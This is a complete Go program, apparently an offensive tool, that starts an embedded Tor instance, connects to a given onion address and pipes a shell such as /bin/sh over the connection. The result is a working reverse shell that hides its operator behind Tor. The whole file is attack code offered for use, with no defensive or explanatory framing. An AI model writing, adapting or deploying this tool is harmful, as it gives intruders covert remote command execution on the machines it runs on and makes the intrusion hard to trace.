package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path"
	"time"

	"github.com/cretz/bine/process"
	"github.com/cretz/bine/tor"
	libtor "github.com/ipsn/go-libtor"
)

type Config struct {
	TorConfig           tor.StartConf
	Timeout             int
	Listener            string
	ReverseShellProgram string
}

var creator = libtor.Creator

type LibTorWrapper struct{}

func (LibTorWrapper) New(ctx context.Context, args ...string) (process.Process, error) {
	return creator.New(ctx, args...)
}

func parseArgs() Config {
	config := Config{}

	config.TorConfig = tor.StartConf{}
	config.TorConfig.ProcessCreator = LibTorWrapper{}
	config.TorConfig.DebugWriter = os.Stderr
	flag.StringVar(&config.Listener, "listener", "", "Listener address. Format: <ONION_ADDR>:<PORT>")
	flag.StringVar(&config.ReverseShellProgram, "reverse-shell-program", "/bin/sh", "Program to execute on reverse-shell")
	flag.IntVar(&config.Timeout, "timeout", 180, "Timeout in seconds for Tor setup")

	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "Usage of %s:\n\n", path.Base(os.Args[0]))
		flag.PrintDefaults()
		fmt.Fprintf(os.Stderr, "\n")
	}

	flag.Parse()

	if config.Listener == "" {
		fmt.Fprintf(os.Stderr, "Listener parameter (-listener) is required.\n\n")
		flag.Usage()
		os.Exit(1)
	}
	return config
}

func main() {
	config := parseArgs()
	// Start tor with some defaults
	fmt.Println("Starting tor instance, please wait a bit...")
	t, err := tor.Start(nil, &config.TorConfig)
	if err != nil {
		log.Panicf("Failed to start tor: %v", err)
	}
	defer t.Close()

	// Wait at most a few minutes
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(config.Timeout)*time.Second)
	defer cancel()

	// Make connection
	dialer, err := t.Dialer(ctx, nil)
	if err != nil {
		log.Fatal(err)
		return
	}

	// Connect to hidden service
	c, err := dialer.Dial("tcp", config.Listener)
	if err != nil {
		log.Fatal("Failed to connect to %v: %v", config.Listener, err)
		return
	}
	defer c.Close()

	fmt.Println("Connected to " + config.Listener + ". Sending shell...")
	// Piping std{in,out,err} to the connection and running shell
	cmd := exec.Command(config.ReverseShellProgram)
	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
	cmd.Run()
}
